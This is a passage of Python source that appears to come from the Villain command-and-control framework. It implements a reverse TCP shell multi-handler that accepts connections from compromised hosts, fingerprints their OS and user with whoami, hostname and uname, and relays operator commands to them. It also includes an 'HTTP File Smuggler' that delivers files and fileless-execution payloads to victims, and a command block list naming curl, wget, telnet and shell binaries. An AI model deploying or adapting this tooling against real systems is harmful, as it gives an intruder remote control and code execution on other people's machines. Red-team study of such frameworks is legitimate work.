				tmp['Sibling ID'] = sibling_id
				siblings_list.append(tmp)

			except KeyError:
				corrupted += 1

		if corrupted:
			print(f'\r[{WARN}] {corrupted} x Corrupted sibling server data entries omitted.')
			print(f'[{WARN}] Possible reason: Sibling server disconnected inelegantly.\n')

		del siblings_clone, tmp
		return siblings_list



class TCP_Sock_Multi_Handler:

	server_name = 'Reverse TCP Multi-Handler'
	listen = True
	listener_initialized = None

	def initiate_nc_listener(self):

		try:
			tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			tcp_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			tcp_server.bind((TCP_Sock_Handler_Settings.bind_address, TCP_Sock_Handler_Settings.bind_port))

		except OSError:
			self.listener_initialized = False
			exit_with_msg(f'{self.server_name} failed to start. Port {TCP_Sock_Handler_Settings.bind_port} seems to be already in use.\n')

		except:
			self.listener_initialized = False
			exit_with_msg(f'{self.server_name} failed to start (Unknown error occurred).\n')

		self.listener_initialized = True
		registered_services.append({
			'service' : self.server_name,
			'socket' : f'{ORANGE}{TCP_Sock_Handler_Settings.bind_address}{END}:{ORANGE}{TCP_Sock_Handler_Settings.bind_port}{END}'
		})
		print(f'\r[{ORANGE}{TCP_Sock_Handler_Settings.bind_address}{END}:{ORANGE}{TCP_Sock_Handler_Settings.bind_port}{END}]::{self.server_name}')

		# Start listening for connections
		tcp_server.listen()

		while self.listen:
			conn, address = tcp_server.accept()
			iface = conn.getsockname()[0]
			sock_t = Thread(target = self.shell_reverse_tcp_handler, args = (conn, address, iface), name = f'tcp_reverse_shell_{address[0]}').start()
			sleep(0.1)



	@staticmethod
	def remove_redirector(session_id):
		try:
			del Sessions_Manager.shell_redirectors[session_id]
		except:
			pass



	def os_fingerprint(self, init_response, prompt_val, conn):
		'''	Detect the operating system and shell environment from the response of the target system
		based on symbols, prompt structures, and common environment clues. '''
		try:
			response_clean = self.remove_non_print(strip_ansi_codes(init_response)).strip()

			# Check for Windows banners (no prompt symbols, but environment-specific clues)
			if re.search('Microsoft Corporation', init_response, re.IGNORECASE):
				# Identify shell type (PowerShell vs cmd.exe)
				if re.search('powershell', init_response, re.IGNORECASE) or re.search('^PS [A-Z]{1}:', prompt_val.strip('\r\n\t ')):
					return [True, 'Windows', 'powershell.exe']
				
				return [True, 'Windows', 'cmd.exe']
			
			# Check if Windows PowerShell from prompt value
			if re.search('^PS [A-Z]{1}:', prompt_val.strip('\r\n\t ')):
				return [True, 'Windows', 'powershell.exe']

			# Analyze based on shell prompts
			if re.search(r'(\$|\#)', response_clean):
				if '㉿' in init_response:  # Special symbol used in zsh prompt (kali, etc.)
					return [True, 'Linux', 'zsh']
				return [True, 'Linux', 'unix']  

			# Desperate attempt to specify if Win or Unix
			conn.sendall('{}\n'.format('uname').encode('utf-8'))
			res = self.recv_timeout(conn, quiet = True, timeout = 5)
			if re.search('Linux', res):
				return [True, 'Linux', 'unix'] 
			elif re.search("The term 'uname' is not recognized", res):
				return [True, 'Windows', 'powershell.exe']
			elif re.search("'uname' is not recognized", res):
				return [True, 'Windows', 'cmd.exe']
			else:
				# Fallback case for unidentified OS or shell
				return [False, False, False]

		except Exception as e:
			return [False, False, False]



	def shell_reverse_tcp_handler(self, conn, address, iface):

		Threading_params.thread_limiter.acquire()

		try:

			timestamp = int(datetime.now().timestamp())

			# Create session unique id
			session_id = f'{uuid4().hex[0:6]}-{uuid4().hex[0:6]}-{uuid4().hex[0:6]}'

			# Identify the OS, Hostname and User
			cmd_echo = False
			hostname_undefined = False
			username = ''
			ident_stat = True
			init_response = ''

			try:
				init_res_data = self.recv_timeout(conn, quiet = True, timeout = 1.5)
				
				if init_res_data:
					init_response += init_res_data
			
				conn.sendall('{}\n'.format('whoami').encode('utf-8'))
				username = self.recv_timeout(conn, quiet = True, timeout = 5)

				if re.search('^whoami', username, re.IGNORECASE): #and (len(username.split('\n')) > 1):
					cmd_echo = True
					username = username[6:]

				# username = self.dehash_prompt(self.clean_nc_response(res))
				init_response += username

				# Capture a prompt value
				conn.sendall('{}\n'.format('').encode('utf-8'))
				prompt_val = self.recv_timeout(conn, quiet = True, timeout = 5)

				# Try to fingerprint OS
				os_fingerprint = self.os_fingerprint(init_response, prompt_val, conn)

				# Fingerprint OS and shell type
				if not os_fingerprint:
					ident_stat = 'Unresponsive'
				else:
					os_type, shell = os_fingerprint[1], os_fingerprint[2]

			except BrokenPipeError:
					ident_stat = 'BrokenPipeError'

			if username in ['ConnectionResetError']:
				ident_stat = 'ConnectionResetError'

			if isinstance(ident_stat, str):
				conn.close()
				print_to_prompt(f'\r[{WARN}] Failed to establish a shell session: {ident_stat}.')
				Threading_params.thread_limiter.release()
				return

			# cmd.exe
			if shell == 'cmd.exe':
				username = username.rsplit('\n', 1)[-1]
			
			# Check if response includes ANSI sequences (bash / zsh)
			if os_type == 'Linux':
				username = strip_ansi_codes(username)
				username = self.remove_non_print(username)
				username = username.split('\n')
				username = [u for u in username if u.strip()]
				username = username[0]


				if cmd_echo:
					username = username.strip()
				else:
					username = username.split('\n')[0].strip()
				
				try:
					conn.sendall('{}\n'.format('hostname').encode('utf-8')) 
					hostname_response = self.recv_timeout(conn, quiet = True, timeout = 5) 

					# Remove command echo if detected
					if re.search ('^' + re.escape('hostname'), hostname_response) and len(hostname_response) > 8:
						hostname_response = hostname_response[8:].strip()
					
					hostname_response = self.remove_non_print(self.clean_nc_response(hostname_response)).strip()
					hostname = hostname_response.split('\n')
					hostname = [h for h in hostname_response if h.strip()]
					hostname = ''.join(hostname)

				except:
					hostname = 'Undefined'

			else:

				tmp = username.split('\\')
				try: 
					hostname = tmp[0].upper()
				except: 
					hostname = 'Undefined'
					
				try: 
					username = tmp[1].strip('\n\r\t >')
				except: 
					username = 'Undefined'

			# Create session object
			Sessions_Manager.active_sessions[session_id] = {
				'IP Address' : address[0],
				'Port' : address[1],
				# 'execution_verified' : False,
				'Status' : 'Active',
				'last_received' : timestamp,
				'OS Type' : os_type,
				'frequency' : 1,
				'Owner' : Hoaxshell.server_unique_id,
				'self_owned' : True,
				'aliased' : False,
				'alias' : None,
				'execution_verified' : True,
				'Computername' : hostname.strip(' \n\r'),
				'Username' : username.strip(' \n\r'),
				'Listener' : 'reverse tcp',
				'Shell' : shell,
				'iface' : iface,
				'prompt' : '',
				'Stability' : 'Stable',
				'echo' : cmd_echo,
				'last_issued_cmd' : ''
			}

			Sessions_Manager.legit_session_ids[session_id] = {
				'OS Type' : os_type,
				'constraint_mode' : False,
				'frequency' : 1,
				'exec_outfile' : False
			}

			Hoaxshell.command_pool[session_id] = []
			print_to_prompt(f'\r[{GREEN}Shell{END}] {session_id} - New session established -> {ORANGE}{address[0]}{END} at {get_datetime()}.')
			print_to_prompt(f'\r[{WARN}] Failed to resolve hostname. Use "repair" to declare it manually.') if hostname_undefined else do_nothing()

			new_session_data = deepcopy(Sessions_Manager.active_sessions[session_id])
			new_session_data['session_id'] = session_id
			new_session_data['self_owned'] = False
			Core_Server.announce_new_session(new_session_data)
			del new_session_data
			sessions = None

			# Start connection state monitor
			Thread(target = self.is_still_connected, args = (session_id, conn), name = f'session_state_monitor_{address[0]}').start()

		except Exception as e:
			conn.close()
			print_to_prompt(f'\r[{ERR}] Failed to establish a shell session: {e}.') if session_id not in Sessions_Manager.sessions_graveyard \
			else do_nothing()
			Threading_params.thread_limiter.release()
			return

		''' TCP shell commands handler '''
		while True:
	   	 
			sessions = clone_dict_keys(Sessions_Manager.active_sessions)

			if session_id not in sessions:
				break
			else:
		   	 
				# If pseudo shell is active OR sibling server has pseudo shell active for this session
				issuer = 'self' if session_id == Hoaxshell.active_shell else None
				if session_id in Sessions_Manager.shell_redirectors.keys():
					issuer = Sessions_Manager.shell_redirectors[session_id]

				if issuer:
					self.recv_bulk(conn, quiet = False if Hoaxshell.active_shell else True, issuer = issuer, \
					session_id = session_id, timeout = TCP_Sock_Handler_Settings.recv_timeout, echo = cmd_echo)

				if Hoaxshell.command_pool[session_id]:

					cmd = Hoaxshell.command_pool[session_id].pop(0)
					villain_issued_cmd = quiet = False
		 
					# Check command type:
					# type str = Normal command
					# type dict = Command issued by Villain's Utilities

					if isinstance(cmd, dict):
						villain_issued_cmd = True
						issuer = cmd['issuer']
						quiet = cmd['quiet']
						cmd = cmd['data']

					Sessions_Manager.active_sessions[session_id]['last_issued_cmd'] = cmd
					
					# If the session is powershell.exe, wrap the command in a try - catch block
					# to ensure stderror will be delivered
					if not villain_issued_cmd and shell == 'powershell.exe':
						cmd = Exec_Utils.ps_try_catch_wrapper(cmd)
			   	 
					try:

						# Check if socket is still alive
						if self.is_socket_closed(conn):
							raise ConnectionResetError
						
						conn.sendall('{}\n'.format(cmd).encode('utf-8'))
				   	 
						# Read response
						self.recv_bulk(conn, quiet = quiet, session_id = session_id, echo = cmd_echo, issuer = issuer, \
							timeout = TCP_Sock_Handler_Settings.recv_timeout)

						# if session_id in Sessions_Manager.sessions_graveyard and \
						# session_id not in Sessions_Manager.active_sessions.keys():
						# 	break

						if Sessions_Manager.active_sessions[session_id]['Status'] != 'Active':
							Sessions_Manager.active_sessions[session_id]['Status'] = 'Active'
							Core_Server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_Manager.active_sessions[session_id]['Status']})
							print(f'\r[{INFO}] Connection with shell session {ORANGE}{session_id}{END} restored!')
							Core_Server.restore_prompt_after_lost_conn(session_id)

					except (socket.error, ConnectionResetError) as e:
						Sessions_Manager.active_sessions[session_id]['Status'] = 'Lost'
						Core_Server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_Manager.active_sessions[session_id]['Status']})
						print(f'\r[{INFO}] Connection with shell session {ORANGE}{session_id}{END} seems to be {LRED}Lost{END} ({e}).') if session_id not in Sessions_Manager.sessions_graveyard else do_nothing()
						Core_Server.restore_prompt_after_lost_conn(session_id)

					finally:
						del cmd
				# else:
				# 	sleep(0.1)

			sleep(0.1)

		conn.close()
		Threading_params.thread_limiter.release()
		return



	def recv_bulk(self, conn, quiet = False, timeout = TCP_Sock_Handler_Settings.recv_timeout, session_id = False, \
			exec_timeout = TCP_Sock_Handler_Settings.await_execution_timeout, issuer = 'self', echo = False):
   	 
		received_empty = 0

		# sleep(0.1)
		while True:
			try:
				data = []
				for i in range(3):
					data_chunk = conn.recv(TCP_Sock_Handler_Settings.recv_timeout_buffer_size)
					sleep(0.1)
					
					if data_chunk:
						data.append(data_chunk)				
					else:
						received_empty += 1
				   	 
						if received_empty >= 3:
							break
						# sleep(0.1)
			   	 
			except ConnectionResetError:

				print_to_prompt(f'\r[{ERR}] Failed to recv: Connection reset by peer.') if session_id not in Sessions_Manager.sessions_graveyard \
				else do_nothing()
				return 'ConnectionResetError'

			except BlockingIOError:
				break

			except:
				pass

			finally:
				output = b''.join(data)
				output = output.decode('utf-8', 'ignore')

				if output:
					user_issued_cmd = Sessions_Manager.active_sessions[session_id]['last_issued_cmd'].rstrip()

					# Command echo filter
					if echo and user_issued_cmd.strip():
						if re.match('^' + re.escape(user_issued_cmd), output):
							output = output[len(user_issued_cmd):]

					if (issuer == 'self' and Hoaxshell.active_shell == session_id) or not quiet:
						print(output, end='', flush=True)		
					elif issuer and issuer != 'self':
						Core_Server.send_receive_one_encrypted(issuer, [output, '', session_id, False], 'command_output', 30) if output else do_nothing()
				
				Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()
				return output 



	def recv_timeout(self, sock, quiet = False, timeout = TCP_Sock_Handler_Settings.recv_timeout, session_id = False, \
			exec_timeout = TCP_Sock_Handler_Settings.await_execution_timeout, \
			user_issued_cmd = False, issuer = 'self'):

		sock.setblocking(0)
		response = []
		data = ''
		begin = time()
		echoed_out = False
		total_packets = 0

		while True:
	   	 
			# if ((not shell_type) and (response and (time() - begin) > timeout)):
			if ((time() - begin) > timeout):
				Core_Server.send_receive_one_encrypted(issuer, ['', '', session_id, True], 'command_output', 30) if issuer != 'self' else do_nothing()
				break
	   	 
			if (time() - (begin + exec_timeout) > timeout):
				Core_Server.send_receive_one_encrypted(issuer, ['', '', session_id, True], 'command_output', 30) if issuer != 'self' else do_nothing()
				quiet = True
				break		   	 

			try:
				# Receive response data chunk
				data = sock.recv(TCP_Sock_Handler_Settings.recv_timeout_buffer_size)
				# print(f'{total_packets} {repr(data)}')
				if data.strip():

					chunk = data.decode('utf-8', 'ignore')
					total_packets += 1
					begin = time()

					# Strip command echo from response
					if user_issued_cmd and not echoed_out:

						if total_packets < 4 and re.match('^' + re.escape(user_issued_cmd), chunk):
						#if total_packets < 4 and re.match(re.escape(user_issued_cmd), ''.join(response)):
							echoed_out = True
							chunk = chunk.replace(user_issued_cmd, '').lstrip('\n\r')
			   	 
					# Output received data
					if issuer == 'self':
						print(chunk, end = '') if not quiet else do_nothing()
						response.append(chunk)
					else:
						Core_Server.send_receive_one_encrypted(issuer, [chunk, '', session_id, False], 'command_output', 30)

					timeout = 0.3
					sleep(0.1)

				else:
					sleep(0.1)

			except ConnectionResetError:

				print_to_prompt(f'\r[{ERR}] Failed to recv: Connection reset by peer.') if session_id not in Sessions_Manager.sessions_graveyard \
				else do_nothing()
				return 'ConnectionResetError'

			except BlockingIOError:
				pass

			except:
				pass
		   	 
		response = ''.join(response)
		print('\n') if (not quiet and response.strip()) else do_nothing()

		if issuer == 'self' and not quiet:
			Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()

		return self.clean_nc_response(response)



	def validate_hostname(self, hostname):

		if len(hostname) > 255:
			return False
   	 
		if hostname[-1] == ".":
			hostname = hostname[:-1]

		allowed = re.compile("(?!-)[A-Z\\d-]{1,63}(?<!-)$", re.IGNORECASE)
		return all(allowed.match(x) for x in hostname.split("."))



	def dehash_prompt(self, response):

		if isinstance(response, str):
			response = response.replace('#', '')
			response = response.replace('$', '')
			response = response.strip(' \n\r')
			return response

		else:
			return str(response)



	def clean_nc_response(self, response):
		response = response.rsplit('\n', 1)[0]
		return response



	def is_still_connected(self, session_id, conn):

		Threading_params.thread_limiter.acquire()

		while True:

			if session_id in Sessions_Manager.sessions_graveyard:
				break

			current_status = Sessions_Manager.active_sessions[session_id]['Status']
			connection_lost = self.is_socket_closed(conn)

			if connection_lost:

				if current_status == 'Active' and session_id not in Sessions_Manager.sessions_graveyard:
					Sessions_Manager.active_sessions[session_id]['Status'] = 'Lost'
					status = f'{LRED}Lost{END}'
					Core_Server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_Manager.active_sessions[session_id]['Status']})
					print(f'\r[{INFO}] Connection with shell session {ORANGE}{session_id}{END} seems to be {status}.')
					Core_Server.restore_prompt_after_lost_conn(session_id)
					break

			else:

				if current_status != 'Active':
					Sessions_Manager.active_sessions[session_id]['Status'] = 'Active'
					Core_Server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_Manager.active_sessions[session_id]['Status']})

			sleep(TCP_Sock_Handler_Settings.alive_echo_exec_timeout)

		Threading_params.thread_limiter.release()
		return



	def search_chunk_for_sentinel_value(self, shell_type, chunk): # DEPRECATED

		clean_chunk = clean_string(chunk)

		if shell_type in ['cmd.exe', 'powershell.exe']:
			re_checks = self.prompt_regex_identifiers['windows']
			for shell,regex in re_checks.items():
				if match_regex(regex, clean_chunk):
					return [True, split_str_on_regex_index(regex, chunk), shell]
	   	 
			return [False]

		elif shell_type in ['unix', 'zsh']:

			zsh = True if shell_type == 'zsh' else False
			prompt_identified = False

			# Search for prompt based on regex identifiers
			clean_chunk = strip_ansi_codes(clean_chunk)

			if shell_type == 'unix':
				re_checks = self.prompt_regex_identifiers[shell_type]

				for shell,regex in re_checks.items():

					if match_regex(regex, clean_chunk):
						prompt_identified = True
						break

			if not prompt_identified:
				# Check for zsh prompt in the raw chunk
				if re.search(self.prompt_regex_identifiers['zsh'], chunk):
					prompt_identified = True

			# Return last chunk and prompt value separated
			if prompt_identified:

				if shell_type in ['unix', 'cmd.exe', 'powershell.exe']:
					delimiter = '\n' #'\r\n'
					sliced = chunk.rsplit(delimiter, 1)

					try:
						if len(sliced) > 1:
							return [True, [sliced[0], sliced[-1]], shell_type]
						else:
							return [True, ['', sliced[0]], shell_type]
					except Exception as e:
						print(f'[{ERR}] search_chunk_for_sentinel_value failed: {e}')

				elif shell_type == 'zsh':
					try:
						sliced = chunk.rsplit('\r\n\r\n', 1)
						print(sliced)
						prompt = ''.join(sliced[-2:])
						data = ''.join(sliced[0:-2])
						return [True, [data, prompt], shell_type]
					except Exception as e:
						return [True, ['', chunk], shell_type]

		return [False]



	def split_str_on_regex_index(self, regex, chunk, clean_chunk):

		start_index = regex.search(clean_chunk).start()
		chunk = chunk[0:start_index]
		prompt = chunk[start_index:]

		# Check if sentinel value is detected multiple times
		sentinel_value = re.findall(regex, prompt)

		if len(sentinel_value) > 1:
			prompt = sentinel_value[-1]

		return [chunk, prompt]



	def remove_non_print(self, text):

		text = strip_ansi_codes(text)
		text = text.split('\n')
		final = []
		new = ''

		for line in text:
			for c in line:

				ascii_ord = ord(c)

				if ascii_ord >= 33 and ascii_ord != 10:
					new += c

			final.append(new)
			new = ''

		return ('\n'.join(final)).replace('[?2004l', '')



	def get_uname_from_zsh_response(self, res):
		username = self.remove_non_print(strip_ansi_codes(res))
		return username.rsplit('┌──(', 1)[-1].split('㉿')[0]



	def search_cmd_for_signature(self, cmd):

		try:
			sibling_server_id = re.findall("[\\S]{1,2}echo '{[a-zA-Z0-9]{32}}'", cmd)[-1]
			sibling_server_id = sibling_server_id.split('echo ')[1].strip('{}\'')

		except:
			sibling_server_id = None

		return sibling_server_id



	def get_cmd_joint(self, session_id):

		if Sessions_Manager.active_sessions[session_id]['Shell'] == 'cmd.exe':
			joint = "&"

		else:
			joint = ";"

		return joint



	def is_socket_closed(self, sock):

		try:

			data = sock.recv(16, socket.MSG_PEEK) #socket.MSG_DONTWAIT
			if len(data) == 0:
				return True

		except BlockingIOError:
			return False

		except ConnectionResetError:
			return True

		except:
			return False

		return False



class Session_Defender:

	is_active = True
	windows_dangerous_commands = ["powershell.exe", "powershell", "cmd.exe", "cmd", "curl", "wget", "telnet"]	
	linux_dangerous_commands = ["bash", "sh", "zsh", "tclsh", "less", "more", "nano", "pico", "vi", "vim", \
							 	"gedit", "atom", "emacs", "telnet"]
	
	interpreters = ['python', 'python3', 'php', 'ruby', 'irb', 'perl', 'jshell', 'node', 'ghci']


	@staticmethod
	def inspect_command(os, cmd):

		# Check if command includes unclosed single/double quotes or backticks OR id ends with backslash
		if Session_Defender.has_unclosed_quotes_or_backticks(cmd):
			return True

		cmd = cmd.strip().lower()

		# Check for common commands and binaries that start interactive sessions within shells OR prompt the user for input
		if os == 'Windows':
			if cmd in (Session_Defender.windows_dangerous_commands + Session_Defender.interpreters):
				return True

		elif os == 'Linux':
			if Session_Defender.ends_with_backslash(cmd) or any(cmd.lower().startswith(c) for c in (\
				Session_Defender.linux_dangerous_commands + Session_Defender.interpreters)):
				return True

		return False



	@staticmethod
	def has_unclosed_quotes_or_backticks(cmd):

		stack = []

		for i, c in enumerate(cmd):
			if c in ["'", '"', "`"]:
				if not stack or stack[-1] != c:
					stack.append(c)
				else:
					stack.pop()
			elif c == "\\" and i < len(cmd) - 1:
				i += 1

		return len(stack) > 0



	@staticmethod
	def ends_with_backslash(cmd):
		return True if cmd.endswith('\\') else False



	@staticmethod
	def print_warning():
		print(f'[{WARN}] Dangerous input detected. This command may break the shell session. If you want to execute it anyway, disable the Session Defender by running "cmdinspector off".')
		Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()



class Exec_Utils:

	sentinel_value = uuid4().hex

	@staticmethod
	def new_process_wrapper(execution_object, session_id):

		shell_type = Sessions_Manager.return_session_attr_value(session_id, 'Shell')

		if shell_type:

			if shell_type == 'powershell.exe':
				return 'Start-Process $PSHOME\\powershell.exe -ArgumentList {' + execution_object + '} -WindowStyle Hidden'

			elif shell_type == 'cmd.exe':
				return 'start "" cmd /k "' + execution_object + '"'

			elif shell_type in ['unix', 'zsh']:
				return execution_object


	@staticmethod
	def ps_try_catch_wrapper(cmd, error_action = ''):
		return f'try {{{cmd}}} catch {{{error_action};echo $_}}'


	@staticmethod
	def unix_stderr_wrapper(cmd):
		return f'({cmd}) 2>&1'


	@staticmethod
	def unix_force_sentinel_value(cmd):
   	 
		try:
			return f'({cmd}); echo {base64.b64encode(Exec_Utils.sentinel_value.encode("utf-8")).decode("utf-8")} | base64 -d'
		except:
			return cmd


	@staticmethod
	def windows_force_sentinel_value(cmd, shell_type):
   	 
		if shell_type == 'cmd.exe':
			return f'({cmd})& echo {Exec_Utils.sentinel_value}'
   	 
		elif shell_type == 'powershell.exe':
			return f'$({cmd}); echo {Exec_Utils.sentinel_value}'

		return cmd



	@staticmethod
	def get_sibling_signature(session_id, signature = None):

		shell_type = Sessions_Manager.return_session_attr_value(session_id, 'Shell')
		server_id = Core_Server.SERVER_UNIQUE_ID if not signature else signature

		if shell_type in ['powershell.exe', 'unix', 'zsh']:
			return ";echo '{" + server_id + "}'"

		elif shell_type == 'cmd.exe':
			return "&echo '{" + server_id + "}'"



class File_Smuggler_Http_Handler(BaseHTTPRequestHandler):

	success_msg = f'\r[{INFO}] A resource was successfully requested from the Http smuggler!'
	error_msg = f'\r[{ERR}] Http file smuggler failed to complete a request.'

	def do_GET(self):

		try:

			ticket = self.path.strip("/")

			if ticket in File_Smuggler.file_transfer_tickets.keys():

				data = File_Smuggler.file_transfer_tickets[ticket]['data']
				issuer = File_Smuggler.file_transfer_tickets[ticket]['issuer']
				self.send_response(200)
				self.end_headers()
				self.wfile.write(data) if isinstance(data, bytes) else self.wfile.write(bytes(data, 'utf-8'))
				File_Smuggler.file_transfer_tickets[ticket]['lifespan'] -= 1

				del data, issuer
				restore_prompt() if File_Smuggler.file_transfer_tickets[ticket]['reset_prompt'] else do_nothing()

				if File_Smuggler.file_transfer_tickets[ticket]['lifespan'] <= 0:
					del File_Smuggler.file_transfer_tickets[ticket]

		except:
			print(self.error_msg)
			Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()
			pass


	def log_message(self, format, *args):
		return



class File_Smuggler:

	server_name = 'HTTP File Smuggler'
	file_transfer_tickets = {}

	Utilities = {
		'fileless_exec' : {
			'supported' : ['powershell.exe', 'unix', 'zsh', 'cmd.exe']
		},
		'upload' : {
			'supported' : ['powershell.exe', 'unix', 'zsh', 'cmd.exe']
		}
	}

	def __init__(self):

		try:
			httpd = HTTPServer(('0.0.0.0', File_Smuggler_Settings.bind_port), File_Smuggler_Http_Handler)

		except OSError:
			exit(f'[{DEBUG}] {self.server_name} failed to start. Port {File_Smuggler_Settings.bind_address} seems to already be in use.\n')

		except:
			exit(f'\n[{DEBUG}] {self.server_name} failed to start (Unknown error occurred).\n')

		http_file_smuggler_server = Thread(target = httpd.serve_forever, args = (), name = 'http_file_smuggler')
		http_file_smuggler_server.daemon = True
		http_file_smuggler_server.start()
		registered_services.append({
			'service' : self.server_name,
			'socket' : f'{ORANGE}{File_Smuggler_Settings.bind_address}{END}:{ORANGE}{File_Smuggler_Settings.bind_port}{END}'
		})
		print(f'[{ORANGE}{File_Smuggler_Settings.bind_address}{END}:{ORANGE}{File_Smuggler_Settings.bind_port}{END}]::{self.server_name}\n')



	@staticmethod
	def create_smuggle_ticket(file_contents, issuer):

		ticket = str(uuid4())
		File_Smuggler.file_transfer_tickets[ticket] = {'data' : file_contents, 'issuer' : issuer, 'lifespan' : 1, 'reset_prompt' : False}
		del file_contents
		return ticket



	@staticmethod
	def upload_file(file_contents, destination_path, session_id, issuer = 'self', port = File_Smuggler_Settings.bind_port, \
		base = f'{cwd}{os.sep}Utilities{os.sep}Shell{os.sep}upload{os.sep}http{os.sep}'):

		# Determine shell type
		shell_type = Sessions_Manager.active_sessions[session_id]['Shell']

		try:

			# Create smuggle ticket
			ticket = File_Smuggler.create_smuggle_ticket(file_contents, issuer)
			server_ip = Sessions_Manager.active_sessions[session_id]['iface']

			ext = bin2ext[shell_type]
			utility = f'{base}src{ext}'
			src = get_file_contents(utility, mode = 'r')

			if not src:
				File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{ERR}] Failed to read utility source files.')
				return
			
			request_file_cmd = multi_set(src, {'*LHOST*' : server_ip, '*LPORT*' : port, '*TICKET*' : ticket, '*DEST*' : destination_path})

			# Construct Villain issued command to request file
			villain_cmd = {
				'data' : request_file_cmd,
				'issuer' : issuer,
				'quiet' : False
			}

			Hoaxshell.command_pool[session_id].append(villain_cmd)

		except:
			File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{ERR}] Upload function failed.')



	@staticmethod
	def fileless_exec(file_contents, session_id, issuer = 'self', port = File_Smuggler_Settings.bind_port, \
			base = f'{cwd}{os.sep}Utilities{os.sep}Shell{os.sep}fileless_exec{os.sep}http{os.sep}'):

		try:
			# Determine shell type
			shell_type = Sessions_Manager.active_sessions[session_id]['Shell']

			# Create smuggle ticket
			ticket = File_Smuggler.create_smuggle_ticket(file_contents, issuer)
			server_ip = Sessions_Manager.active_sessions[session_id]['iface']

			ext = bin2ext[shell_type]
			utility = f'{base}src{ext}'
			src = get_file_contents(utility, mode = 'r')

			if not src:
				File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{ERR}] Failed to read utility source files.')
				return
			
			exec_file_cmd = multi_set(src, {'*LHOST*' : server_ip, '*LPORT*' : port, '*TICKET*' : ticket})

			# Construct Villain issued command to request file
			villain_cmd = {
				'data' : exec_file_cmd,
				'issuer' : issuer,
				'quiet' : False #if issuer == 'self' else True
			}

			Hoaxshell.command_pool[session_id].append(villain_cmd)

		except Exception as e:
			File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{ERR}] Fileless exec function failed: {e}')



	@staticmethod
	def announce_automatic_cmd_failure(issuer, error):

		if issuer == 'self':
			print_to_prompt(error)

		else:
			Core_Server.send_receive_one_encrypted(issuer, error, 'notification')



# Global Prompt restoration functions
def restore_prompt():

	if Hoaxshell.active_shell:
		Hoaxshell.rst_shell_prompt() if Hoaxshell.prompt_ready else Hoaxshell.set_shell_prompt_ready()
	else:
		Main_prompt.rst_prompt() if Main_prompt.ready else Main_prompt.set_main_prompt_ready()



def print_to_prompt(msg):
	print(msg)
	restore_prompt()
